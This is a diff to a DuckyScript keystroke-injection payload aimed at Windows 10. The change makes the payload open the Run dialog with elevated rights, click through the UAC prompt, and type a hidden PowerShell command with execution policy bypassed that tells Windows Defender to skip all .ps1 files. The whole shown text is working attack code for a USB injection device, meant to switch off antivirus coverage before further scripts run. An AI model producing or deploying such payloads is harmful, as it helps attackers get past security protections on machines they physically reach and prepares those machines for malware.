@@ -7,9 +7,13 @@ REM Target: Windows 10
 
 GUI r
 DELAY 500
-STRING powershell.exe -NoP -W Hidden -Exec Bypass -command "Add-MpPreference -ExclusionExtension 'ps1'"
-ENTER
+CTRL-SHIFT ENTER
 DELAY 500
+TAB
+REPEAT 1
+ENTER
+DELAY 1000
+STRING powershell.exe -NoP -W Hidden -Exec Bypass -command "Add-MpPreference -ExclusionExtension 'ps1'"
 GUI r
 STRING CMD
 ENTER
